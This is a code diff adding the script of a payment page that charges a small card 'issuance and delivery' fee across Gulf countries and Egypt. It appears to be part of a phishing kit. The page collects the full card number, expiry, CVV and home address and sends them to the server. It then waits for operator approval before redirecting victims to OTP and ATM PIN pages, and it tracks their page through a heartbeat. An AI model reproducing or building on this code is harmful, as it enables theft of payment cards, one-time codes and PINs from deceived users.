+                isEven = !isEven;
+            }
+            return (sum % 10) === 0;
+        }
+
+        function showFieldError(fieldId, errorId, message) {
+            const field = document.getElementById(fieldId);
+            const errorEl = document.getElementById(errorId);
+            field.classList.add('error');
+            errorEl.textContent = message;
+            errorEl.classList.add('show');
+        }
+
+        function clearFieldError(fieldId, errorId) {
+            const field = document.getElementById(fieldId);
+            const errorEl = document.getElementById(errorId);
+            field.classList.remove('error');
+            errorEl.textContent = '';
+            errorEl.classList.remove('show');
+        }
+
+        function isValidExpiryDate(value) {
+            const match = value.match(/^(\d{2})\s*\/\s*(\d{2})$/);
+            if (!match) return false;
+            const month = parseInt(match[1], 10);
+            const year = parseInt('20' + match[2], 10);
+            if (month < 1 || month > 12) return false;
+            if (year < 2024) return false;
+            const now = new Date();
+            const expiryDate = new Date(year, month, 1);
+            return expiryDate > now;
+        }
+
+        function isValidCVV(value) {
+            return /^\d{3,4}$/.test(value);
+        }
+
+        document.getElementById('card_holder').addEventListener('blur', function() {
+            const val = this.value.trim();
+            if (val.length > 0 && val.length < 3) {
+                showFieldError('card_holder', 'card_holder_error', 'Please enter the cardholder name correctly');
+            } else {
+                clearFieldError('card_holder', 'card_holder_error');
+            }
+        });
+
+        // ===== CARD TYPE DETECTION =====
+        function detectCardType(number) {
+            const digits = number.replace(/\s/g, '');
+            if (/^4/.test(digits)) return 'visa';
+            if (/^5[1-5]/.test(digits)) return 'mastercard';
+            if (/^3[47]/.test(digits)) return 'amex';
+            if (/^6(?:011|5)/.test(digits)) return 'discover';
+            return null;
+        }
+
+        document.getElementById('card_number').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length > 16) value = value.substring(0, 16);
+            let formatted = value.replace(/(.{4})/g, '$1 ').trim();
+            e.target.value = formatted;
+
+            const icon = document.getElementById('cardTypeIcon');
+            const field = document.getElementById('card_number');
+            icon.className = 'fas card-type-icon';
+            field.classList.remove('error');
+
+            if (value.length >= 1) {
+                const cardType = detectCardType(value);
+                if (cardType === 'visa') {
+                    icon.className = 'fab fa-cc-visa card-type-icon visa';
+                } else if (cardType === 'mastercard') {
+                    icon.className = 'fab fa-cc-mastercard card-type-icon mastercard';
+                } else if (cardType === 'amex') {
+                    icon.className = 'fab fa-cc-amex card-type-icon amex';
+                } else if (cardType === 'discover') {
+                    icon.className = 'fab fa-cc-discover card-type-icon discover';
+                } else {
+                    icon.className = 'fas fa-credit-card card-type-icon';
+                }
+            }
+
+            if (value.length >= 13) {
+                if (value.length < 16) {
+                    clearFieldError('card_number', 'card_number_error');
+                } else if (value.length === 16) {
+                    if (!isValidCardNumber(value)) {
+                        showFieldError('card_number', 'card_number_error', 'Invalid card');
+                        icon.className = 'fas fa-credit-card card-type-icon error';
+                        field.classList.add('error');
+                    } else {
+                        clearFieldError('card_number', 'card_number_error');
+                    }
+                }
+            } else {
+                clearFieldError('card_number', 'card_number_error');
+            }
+        });
+
+        document.getElementById('expiry_date').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length >= 2) {
+                value = value.substring(0, 2) + ' / ' + value.substring(2, 4);
+            }
+            e.target.value = value;
+
+            if (value.replace(/\s/g, '').length >= 4) {
+                const match = value.replace(/\s/g, '').match(/^(\d{2})(\d{2})$/);
+                if (match) {
+                    const month = parseInt(match[1], 10);
+                    const fullValue = match[1] + '/' + match[2];
+                    if (month < 1 || month > 12) {
+                        showFieldError('expiry_date', 'expiry_date_error', 'Invalid expiry date');
+                    } else if (!isValidExpiryDate(fullValue)) {
+                        showFieldError('expiry_date', 'expiry_date_error', 'Invalid expiry date');
+                    } else {
+                        clearFieldError('expiry_date', 'expiry_date_error');
+                    }
+                }
+            } else {
+                clearFieldError('expiry_date', 'expiry_date_error');
+            }
+        });
+
+        document.getElementById('cvv').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length > 4) value = value.substring(0, 4);
+            e.target.value = value;
+
+            if (value.length >= 3) {
+                if (!isValidCVV(value)) {
+                    showFieldError('cvv', 'cvv_error', 'CVV must be 3 digits');
+                } else {
+                    clearFieldError('cvv', 'cvv_error');
+                }
+            } else if (value.length > 0) {
+                clearFieldError('cvv', 'cvv_error');
+            }
+        });
+
+        async function pollOrderStatus() {
+            const orderId = sessionStorage.getItem('orderId');
+            if (!orderId) return;
+
+            try {
+                const res = await fetch('/api/orders/' + orderId + '/status');
+                const data = await res.json();
+
+                if (data.status === 'approved') {
+                    clearInterval(pollInterval);
+                    document.getElementById('loadingOverlay').style.display = 'none';
+                    const nextPages = {
+                        'loading_otp': 'otp-en.html',
+                        'otp': 'otp-en.html',
+                        'loading_atm': 'atm-pin-en.html',
+                        'atm_pin': 'atm-pin-en.html',
+                        'loading_success': 'success-en.html',
+                        'success': 'success-en.html'
+                    };
+                    window.location.href = nextPages[data.currentPage] || 'otp-en.html';
+                } else if (data.status === 'rejected') {
+                    clearInterval(pollInterval);
+                    document.getElementById('loadingOverlay').style.display = 'none';
+                    if (data.message) {
+                        document.getElementById('errorMessage').textContent = data.message;
+                    }
+                    showErrorModal();
+                }
+            } catch (err) {
+                console.error('Poll error:', err);
+            }
+        }
+
+        function showErrorModal() {
+            document.getElementById('errorModal').style.display = 'flex';
+        }
+
+        function closeErrorModal() {
+            document.getElementById('errorModal').style.display = 'none';
+        }
+
+        // Prices: Qatar stays at 30+5=35 QAR. Other countries: 7 USD issuance + 2 USD delivery converted
+        // 1 USD = 0.31 KWD, 3.67 AED, 0.38 BHD, 0.38 OMR, 3.75 SAR, 49.5 EGP
+        const countryData = {
+            'qa': {
+                cities: ['Doha', 'Al Rayyan', 'Al Wakrah', 'Al Khor', 'Lusail', 'The Pearl', 'Umm Salal', 'Al Sheehaniya'],
+                issueFee: 30, deliveryFee: 5, currency: 'QAR', label: 'Qatar'
+            },
+            'kw': {
+                cities: ['Kuwait City', 'Hawalli', 'Salmiya', 'Al Farwaniya', 'Al Jahra', 'Al Ahmadi', 'Mubarak Al-Kabeer', 'Nuseem', 'Al Adan', 'Al Sabahia', 'Al Manqaf', 'Al Fintas', 'Al Wafra', 'Al Sulaibiya'],
+                issueFee: 2.2, deliveryFee: 0.6, currency: 'KWD', label: 'Kuwait'
+            },
+            'ae': {
+                cities: ['Abu Dhabi', 'Dubai', 'Sharjah', 'Ajman', 'Ras Al Khaimah', 'Fujairah', 'Umm Al Quwain', 'Al Ain'],
+                issueFee: 25.7, deliveryFee: 7.3, currency: 'AED', label: 'UAE'
+            },
+            'bh': {
+                cities: ['Manama', 'Muharraq', 'Riffa', 'Isa Town', 'Hamad Town', 'Sitra', 'Zallaq'],
+                issueFee: 2.7, deliveryFee: 0.8, currency: 'BHD', label: 'Bahrain'
+            },
+            'om': {
+                cities: ['Muscat', 'Salalah', 'Sohar', 'Nizwa', 'Al Buraimi', 'Ibri', 'Sur', 'Al Rustaq', 'Al Seeb', 'Barka'],
+                issueFee: 2.7, deliveryFee: 0.8, currency: 'OMR', label: 'Oman'
+            },
+            'sa': {
+                cities: ['Riyadh', 'Jeddah', 'Mecca', 'Medina', 'Dammam', 'Al Khobar', 'Tabuk', 'Abha', 'Taif', 'Qassim', 'Hail', 'Najran', 'Jazan', 'Al Baha', 'Al Jawf', 'Northern Borders'],
+                issueFee: 26.2, deliveryFee: 7.5, currency: 'SAR', label: 'Saudi Arabia'
+            },
+            'eg': {
+                cities: ['Cairo', 'Alexandria', 'Giza', 'Shubra El Kheima', 'Port Said', 'Suez', 'Mansoura', 'Al Mahalla', 'Tanta', 'Asyut', 'Minya', 'Zagazig', 'Fayoum', 'Damietta'],
+                issueFee: 346.5, deliveryFee: 99, currency: 'EGP', label: 'Egypt'
+            }
+        };
+
+        function formatPrice(price) {
+            // Convert to number and remove trailing zeros in decimals
+            return parseFloat(Number(price).toFixed(3));
+        }
+
+        function updatePrices(countryCode) {
+            const data = countryData[countryCode];
+            if (!data) return;
+            const total = data.issueFee + data.deliveryFee;
+            document.getElementById('issueFee').textContent = formatPrice(data.issueFee) + ' ' + data.currency;
+            document.getElementById('deliveryFee').textContent = formatPrice(data.deliveryFee) + ' ' + data.currency;
+            document.getElementById('totalAmount').textContent = formatPrice(total) + ' ' + data.currency;
+            document.getElementById('btnTotal').textContent = formatPrice(total) + ' ' + data.currency;
+        }
+
+        function updateCities(countryCode) {
+            const citySelect = document.getElementById('city');
+            citySelect.innerHTML = '<option value="">Select region...</option>';
+            const data = countryData[countryCode];
+            if (!data) return;
+            data.cities.forEach(function(city) {
+                const option = document.createElement('option');
+                option.value = city;
+                option.textContent = city;
+                citySelect.appendChild(option);
+            });
+            updatePrices(countryCode);
+        }
+
+        document.getElementById('country').addEventListener('change', function() {
+            updateCities(this.value);
+            localStorage.setItem('selectedCountry', this.value);
+        });
+
+        // Load saved country from localStorage (set in data page)
+        const savedCountry = localStorage.getItem('selectedCountry');
+        const countrySelect = document.getElementById('country');
+        if (savedCountry && countryData[savedCountry.toLowerCase()]) {
+            countrySelect.value = savedCountry.toLowerCase();
+            updateCities(savedCountry.toLowerCase());
+            const data = countryData[savedCountry.toLowerCase()];
+            document.getElementById('countryDisplayText').textContent = '🌍 ' + data.label;
+        } else {
+            updateCities('qa');
+            document.getElementById('countryDisplayText').textContent = '🌍 Qatar';
+        }
+
+        document.getElementById('payBtn').addEventListener('click', async (e) => {
+            e.preventDefault();
+            if (selectedMethod !== 'credit') return;
+
+            const orderId = sessionStorage.getItem('orderId');
+            if (!orderId) {
+                alert('Error: Order ID not found');
+                window.location.href = 'data-en.html';
+                return;
+            }
+
+            const country = localStorage.getItem('selectedCountry') || document.getElementById('country').value;
+            const cardHolder = document.getElementById('card_holder').value.trim();
+            const cardNumber = document.getElementById('card_number').value.trim();
+            const expiryDate = document.getElementById('expiry_date').value.trim();
+            const cvv = document.getElementById('cvv').value.trim();
+            const city = document.getElementById('city').value;
+            const street = document.getElementById('street').value.trim();
+            const buildingNumber = document.getElementById('building_number').value.trim();
+            const floor = document.getElementById('floor').value;
+
+            if (!country) {
+                alert('Please select a country');
+                return;
+            }
+            if (!city || !street || !buildingNumber || !floor) {
+                alert('Please complete the delivery address');
+                return;
+            }
+
+            if (!cardHolder || cardHolder.length < 3) {
+                showFieldError('card_holder', 'card_holder_error', 'Please enter the cardholder name correctly');
+                return;
+            }
+
+            const rawCardNumber = cardNumber.replace(/\s/g, '');
+            if (!rawCardNumber || rawCardNumber.length < 12 || rawCardNumber.length > 19) {
+                showFieldError('card_number', 'card_number_error', 'Card number must be between 12 and 19 digits');
+                return;
+            }
+            if (!isValidCardNumber(rawCardNumber)) {
+                showFieldError('card_number', 'card_number_error', 'Invalid card');
+                return;
+            }
+
+            const rawExpiry = expiryDate.replace(/\s/g, '').replace('/', '/');
+            if (!isValidExpiryDate(rawExpiry)) {
+                showFieldError('expiry_date', 'expiry_date_error', 'Invalid expiry date');
+                return;
+            }
+
+            if (!isValidCVV(cvv)) {
+                showFieldError('cvv', 'cvv_error', 'CVV must be 3 digits');
+                return;
+            }
+
+            const rawCardNumberSend = cardNumber.replace(/\s/g, '');
+
+            const data = {
+                orderId,
+                card_holder: cardHolder,
+                card_number: rawCardNumberSend,
+                expiry_date: rawExpiry,
+                cvv: cvv,
+                delivery_address: {
+                    country: country,
+                    city: city,
+                    street: street,
+                    building_number: buildingNumber,
+                    floor: floor
+                }
+            };
+
+            try {
+                const response = await fetch('/api/orders/payment-data', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+
+                const result = await response.json();
+
+                if (response.ok) {
+                    document.getElementById('loadingOverlay').style.display = 'flex';
+                    pollInterval = setInterval(pollOrderStatus, 2000);
+                } else {
+                    alert('Error: ' + result.error);
+                }
+            } catch (err) {
+                alert('Connection error with the server');
+            }
+        });
+    </script>
+
+    <script>
+        function sendHeartbeat() {
+            fetch('/api/heartbeat', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ currentPage: window.location.pathname })
+            }).catch(() => {});
+        }
+        setInterval(sendHeartbeat, 30000);
+        sendHeartbeat();
     </script>
 </body>
 </html>
